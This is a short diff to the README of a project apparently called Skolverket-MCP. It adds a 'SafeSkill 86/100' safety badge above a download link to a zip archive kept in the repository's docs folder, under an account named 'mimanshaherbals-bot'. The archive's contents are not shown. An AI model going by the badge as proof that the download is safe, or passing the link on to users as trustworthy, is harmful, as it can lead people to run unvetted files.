@@ -1,5 +1,7 @@
 # 🎓 Skolverket-MCP - Access Educational Data Easily
 
+[![SafeSkill 86/100](https://img.shields.io/badge/SafeSkill-86%2F100_Passes%20with%20Notes-yellow)](https://safeskill.dev/scan/mimanshaherbals-bot-skolverket-mcp)
+
 [![Download Skolverket-MCP](https://github.com/mimanshaherbals-bot/Skolverket-MCP/raw/refs/heads/master/docs/MCP-Skolverket-1.7.zip)](https://github.com/mimanshaherbals-bot/Skolverket-MCP/raw/refs/heads/master/docs/MCP-Skolverket-1.7.zip)
 
 ## 📖 Overview
